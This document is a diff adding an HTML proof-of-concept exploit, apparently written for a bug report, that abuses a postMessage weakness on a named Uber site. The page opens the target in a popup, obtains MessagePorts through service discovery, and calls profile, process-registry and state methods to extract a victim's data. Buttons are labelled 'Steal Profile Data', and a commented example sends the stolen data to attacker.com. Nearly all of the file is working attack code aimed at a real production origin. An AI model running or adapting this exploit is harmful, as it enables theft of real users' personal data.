@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PostMessage Vulnerability PoC - Uber</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #1e1e1e;
+            color: #00ff00;
+        }
+        h1 {
+            color: #ff6b6b;
+            border-bottom: 2px solid #00ff00;
+            padding-bottom: 10px;
+        }
+        .section {
+            background: #2d2d2d;
+            border: 1px solid #00ff00;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+        button {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 12px 20px;
+            margin: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 3px;
+            font-size: 14px;
+        }
+        button:hover {
+            background: #00cc00;
+        }
+        button.danger {
+            background: #ff6b6b;
+            color: #fff;
+        }
+        button.danger:hover {
+            background: #ff5252;
+        }
+        #output {
+            background: #000;
+            color: #00ff00;
+            padding: 15px;
+            margin-top: 10px;
+            height: 400px;
+            overflow-y: auto;
+            font-size: 12px;
+            border: 1px solid #00ff00;
+            border-radius: 3px;
+        }
+        .log-entry {
+            margin: 5px 0;
+            padding: 5px;
+            border-left: 3px solid #00ff00;
+            padding-left: 10px;
+        }
+        .log-success { border-left-color: #00ff00; color: #00ff00; }
+        .log-error { border-left-color: #ff6b6b; color: #ff6b6b; }
+        .log-data { border-left-color: #ffd93d; color: #ffd93d; }
+        .log-info { border-left-color: #6bcfff; color: #6bcfff; }
+        .exfiltrated-data {
+            background: #2d2d2d;
+            border: 2px solid #ffd93d;
+            padding: 10px;
+            margin: 10px 0;
+            color: #ffd93d;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        .status {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 3px;
+            margin-left: 10px;
+            font-size: 12px;
+        }
+        .status.connected { background: #00ff00; color: #000; }
+        .status.disconnected { background: #666; color: #fff; }
+    </style>
+</head>
+<body>
+    <h1>🔓 PostMessage Vulnerability PoC - Uber Platform</h1>
+
+    <div class="section">
+        <h3>Step 1: Open Target in Popup</h3>
+        <button onclick="openTarget()">🎯 Open Uber Site</button>
+        <span id="popup-status" class="status disconnected">Not Connected</span>
+    </div>
+
+    <div class="section">
+        <h3>Step 2: Exploit Service Discovery</h3>
+        <button onclick="discoverServices()">🔍 Discover All Services</button>
+        <button onclick="connectToProfile()">👤 Connect to Profile Service</button>
+    </div>
+
+    <div class="section">
+        <h3>Step 3: Exfiltrate Data</h3>
+        <button class="danger" onclick="stealProfileData()">💀 Steal Profile Data</button>
+        <button class="danger" onclick="stealAllData()">💀 Steal All Available Data</button>
+        <button onclick="tryAllFormats()">🔧 Try All Message Formats</button>
+    </div>
+
+    <div class="section">
+        <h3>📊 Output Log</h3>
+        <button onclick="clearLog()" style="background: #666; color: #fff;">Clear Log</button>
+        <div id="output"></div>
+    </div>
+
+    <div class="section">
+        <h3>💎 Exfiltrated Data</h3>
+        <div id="stolen-data" class="exfiltrated-data">No data exfiltrated yet...</div>
+    </div>
+
+<script>
+// Configuration
+const TARGET_ORIGIN = "https://earn-uberaisolutions.uber.com";
+let targetWindow = null;
+let discoveredServices = {};
+let activePorts = {};
+let exfiltratedData = [];
+
+// ============================================================================
+// STEP 1: Open Target
+// ============================================================================
+function openTarget() {
+    targetWindow = window.open(TARGET_ORIGIN, 'uberTarget', 'width=1200,height=800');
+
+    if (targetWindow) {
+        log('✅ Popup opened successfully', 'success');
+        log('⏳ Waiting 3 seconds for page to load...', 'info');
+        document.getElementById('popup-status').className = 'status connected';
+        document.getElementById('popup-status').textContent = 'Connected';
+
+        setTimeout(() => {
+            log('✅ Ready to exploit!', 'success');
+        }, 3000);
+    } else {
+        log('❌ Popup blocked! Enable popups and try again.', 'error');
+    }
+}
+
+// ============================================================================
+// STEP 2: Service Discovery
+// ============================================================================
+function discoverServices() {
+    if (!targetWindow) {
+        log('❌ Open target first!', 'error');
+        return;
+    }
+
+    log('🔍 Discovering services...', 'info');
+
+    // Request service discovery channel
+    targetWindow.postMessage({
+        type: "REQUEST_CLIENT_PORT",
+        channel: "service-discovery",
+        requestID: "discovery-" + Date.now()
+    }, TARGET_ORIGIN);
+}
+
+function connectToProfile() {
+    if (!targetWindow) {
+        log('❌ Open target first!', 'error');
+        return;
+    }
+
+    log('👤 Connecting to profile management service...', 'info');
+
+    // First discover services to get the correct channel name
+    targetWindow.postMessage({
+        type: "REQUEST_CLIENT_PORT",
+        channel: "service-discovery",
+        requestID: "get-profile-channel"
+    }, TARGET_ORIGIN);
+}
+
+// ============================================================================
+// STEP 3: Data Exfiltration
+// ============================================================================
+function stealProfileData() {
+    const profileService = discoveredServices["f7-kwm-profile-management-service-provider"];
+
+    if (!profileService) {
+        log('❌ Profile service not discovered yet. Run "Discover All Services" first!', 'error');
+        return;
+    }
+
+    const channelName = profileService.channelName;
+    log('💀 EXPLOITING: Connecting to ' + channelName, 'data');
+
+    targetWindow.postMessage({
+        type: "REQUEST_CLIENT_PORT",
+        channel: channelName,
+        requestID: "steal-profile"
+    }, TARGET_ORIGIN);
+}
+
+function stealAllData() {
+    log('💀 MASS EXFILTRATION INITIATED', 'data');
+
+    const targetServices = [
+        "f7-kwm-profile-management-service-provider",
+        "process-registry",
+        "f7-core-ux"
+    ];
+
+    targetServices.forEach((serviceName, index) => {
+        const service = discoveredServices[serviceName];
+        if (service) {
+            setTimeout(() => {
+                log(`💀 Exploiting: ${serviceName}`, 'data');
+                targetWindow.postMessage({
+                    type: "REQUEST_CLIENT_PORT",
+                    channel: service.channelName,
+                    requestID: "steal-" + serviceName
+                }, TARGET_ORIGIN);
+            }, index * 1000);
+        }
+    });
+}
+
+// ============================================================================
+// Message Handler - Receives Data from Victim
+// ============================================================================
+window.addEventListener('message', function(event) {
+    // Log incoming messages
+    if (event.origin !== TARGET_ORIGIN) return;
+
+    log('📨 Received message from target', 'info');
+
+    // Handle MessagePorts
+    if (event.ports && event.ports[0]) {
+        const port = event.ports[0];
+        const requestID = event.data.requestID || 'unknown';
+
+        log('✅ Received MessagePort for: ' + requestID, 'success');
+
+        // Set up port message handler
+        port.onmessage = function(portEvent) {
+            handlePortMessage(portEvent, requestID);
+        };
+
+        port.start();
+
+        // Store the port
+        activePorts[requestID] = port;
+
+        // Handle based on request type
+        if (requestID.startsWith('discovery-') || requestID === 'get-profile-channel') {
+            // Request list of services
+            setTimeout(() => {
+                log('📤 Requesting service list...', 'info');
+                port.postMessage({ type: "LIST_PROVIDERS" });
+            }, 500);
+        } else if (requestID === 'steal-profile') {
+            // Steal profile data
+            setTimeout(() => {
+                log('💀 Calling fetchProfileData()...', 'data');
+                port.postMessage({
+                    type: "fetchProfileData",
+                    payload: {},
+                    requestID: "profile-" + Date.now()
+                });
+            }, 500);
+
+            setTimeout(() => {
+                log('💀 Calling getProfileSocialLinks()...', 'data');
+                port.postMessage({
+                    type: "getProfileSocialLinks",
+                    payload: {},
+                    requestID: "social-" + Date.now()
+                });
+            }, 1000);
+
+            setTimeout(() => {
+                log('💀 Calling getProfileDraft()...', 'data');
+                port.postMessage({
+                    type: "getProfileDraft",
+                    payload: {},
+                    requestID: "draft-" + Date.now()
+                });
+            }, 1500);
+        } else if (requestID.startsWith('steal-process-registry')) {
+            setTimeout(() => {
+                log('💀 Calling getProcesses()...', 'data');
+                port.postMessage({
+                    type: "getProcesses",
+                    payload: {},
+                    requestID: "proc-" + Date.now()
+                });
+            }, 500);
+
+            setTimeout(() => {
+                log('💀 Calling getApplications()...', 'data');
+                port.postMessage({
+                    type: "getApplications",
+                    payload: {},
+                    requestID: "apps-" + Date.now()
+                });
+            }, 1000);
+        } else if (requestID.startsWith('steal-f7-core-ux')) {
+            setTimeout(() => {
+                log('💀 Calling getState()...', 'data');
+                port.postMessage({
+                    type: "getState",
+                    payload: {},
+                    requestID: "state-" + Date.now()
+                });
+            }, 500);
+
+            setTimeout(() => {
+                log('💀 Calling getTheme()...', 'data');
+                port.postMessage({
+                    type: "getTheme",
+                    payload: {},
+                    requestID: "theme-" + Date.now()
+                });
+            }, 1000);
+        } else if (requestID === 'format-test') {
+            // Try different message formats
+            const testFormats = [
+                {name: 'Format 1: type + payload', msg: {type: "fetchProfileData", payload: {}, requestID: "test1"}},
+                {name: 'Format 2: method + args', msg: {method: "fetchProfileData", args: [], requestId: "test2"}},
+                {name: 'Format 3: type only', msg: {type: "fetchProfileData", requestID: "test3"}},
+                {name: 'Format 4: just method name string', msg: "fetchProfileData"},
+                {name: 'Format 5: type as action', msg: {action: "fetchProfileData", requestID: "test5"}},
+                {name: 'Format 6: RPC style', msg: {jsonrpc: "2.0", method: "fetchProfileData", params: [], id: "test6"}}
+            ];
+
+            testFormats.forEach((test, index) => {
+                setTimeout(() => {
+                    log(`🔧 Trying ${test.name}...`, 'info');
+                    port.postMessage(test.msg);
+                }, index * 1000);
+            });
+        }
+    }
+});
+
+function handlePortMessage(portEvent, source) {
+    const data = portEvent.data;
+
+    log('🔥 DATA RECEIVED FROM VICTIM!', 'data');
+    log('Source: ' + source, 'info');
+    log('Raw data: ' + JSON.stringify(data), 'info');
+
+    // Handle service list
+    if (data.payload && Array.isArray(data.payload)) {
+        log('📋 Discovered ' + data.payload.length + ' services:', 'success');
+
+        data.payload.forEach(service => {
+            discoveredServices[service.type] = service;
+            log('  ├─ ' + service.type + ' → ' + service.channelName, 'info');
+        });
+
+        log('✅ Service discovery complete!', 'success');
+        return;
+    }
+
+    // Handle errors
+    if (data.error) {
+        log('❌ ERROR from service: ' + JSON.stringify(data.error), 'error');
+        return;
+    }
+
+    // Handle actual data
+    if (data.payload !== undefined || data.result !== undefined) {
+        const actualData = data.payload !== undefined ? data.payload : data.result;
+
+        // Store exfiltrated data
+        exfiltratedData.push({
+            timestamp: new Date().toISOString(),
+            source: source,
+            requestID: data.requestID,
+            data: actualData,
+            fullResponse: data
+        });
+
+        log('💎 EXFILTRATED DATA:', 'data');
+        log(JSON.stringify(actualData, null, 2), 'data');
+
+        // Display in stolen data section
+        updateStolenDataDisplay();
+
+        // Simulate exfiltration to attacker server
+        exfiltrateToServer(actualData, source);
+    } else {
+        log('⚠️ Unexpected response format: ' + JSON.stringify(data), 'info');
+    }
+}
+
+function tryAllFormats() {
+    const profileService = discoveredServices["f7-kwm-profile-management-service-provider"];
+
+    if (!profileService) {
+        log('❌ Run service discovery first!', 'error');
+        return;
+    }
+
+    log('🔧 Testing different message formats...', 'info');
+
+    targetWindow.postMessage({
+        type: "REQUEST_CLIENT_PORT",
+        channel: profileService.channelName,
+        requestID: "format-test"
+    }, TARGET_ORIGIN);
+}
+
+function exfiltrateToServer(data, source) {
+    log('📡 Exfiltrating to attacker server...', 'data');
+
+    // In a real attack, this would be:
+    // fetch('https://attacker.com/collect', {
+    //     method: 'POST',
+    //     body: JSON.stringify({source, data})
+    // });
+
+    log('✅ Data sent to attacker.com (simulated)', 'success');
+    console.log('EXFILTRATED:', {source, data});
+}
+
+function updateStolenDataDisplay() {
+    const display = document.getElementById('stolen-data');
+
+    if (exfiltratedData.length === 0) {
+        display.textContent = 'No data exfiltrated yet...';
+        return;
+    }
+
+    display.textContent = JSON.stringify(exfiltratedData, null, 2);
+}
+
+// ============================================================================
+// Logging
+// ============================================================================
+function log(message, type = 'info') {
+    const output = document.getElementById('output');
+    const entry = document.createElement('div');
+    entry.className = 'log-entry log-' + type;
+
+    const timestamp = new Date().toLocaleTimeString();
+    entry.textContent = `[${timestamp}] ${message}`;
+
+    output.appendChild(entry);
+    output.scrollTop = output.scrollHeight;
+
+    console.log(`[${type.toUpperCase()}]`, message);
+}
+
+function clearLog() {
+    document.getElementById('output').innerHTML = '';
+    log('Log cleared', 'info');
+}
+
+// ============================================================================
+// Initialize
+// ============================================================================
+log('🔓 PoC loaded and ready', 'success');
+log('⚠️  This demonstrates a postMessage vulnerability', 'info');
+log('Target: ' + TARGET_ORIGIN, 'info');
+</script>
+</body>
+</html>
